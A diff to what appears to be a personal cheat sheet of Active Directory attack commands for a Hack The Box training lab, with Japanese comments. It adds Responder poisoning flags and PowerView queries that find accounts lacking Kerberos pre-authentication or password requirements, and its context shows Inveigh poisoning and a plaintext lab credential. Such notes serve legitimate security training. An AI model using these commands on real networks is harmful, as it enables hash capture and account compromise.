@@ -287,7 +287,7 @@ netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.15
 fping -asgq 172.16.5.0/23
 
 ### LinuxからのLLMNR/NBT-NS ポイズニング
-sudo responder -I ens224 
+sudo responder -I ens224 -wrfv
 ### WindowsからのLLMNR/NBT-NS ポイズニング
 PS C:\htb> Import-Module .\Inveigh.ps1 #ps版はすでに保守されておらず、C#版が保守されているとのこと。自分でbuildする必要がある。
 PS C:\htb> Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y　
@@ -331,3 +331,9 @@ Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD
 PS C:\htb> $password = ConvertTo-SecureString "Klmcargo2" -AsPlainText -Force
 PS C:\htb> $cred = new-object System.Management.Automation.PSCredential ("INLANEFREIGHT\forend", $password)
 PS C:\htb> Enter-PSSession -ComputerName ACADEMY-EA-MS01 -Credential $cred
+
+### Enumerating for DONT_REQ_PREAUTH Value using Get-DomainUser
+PS C:\htb> Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl
+
+### Checking for PASSWD_NOTREQD Setting using Get-DomainUser
+PS C:\htb> Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol
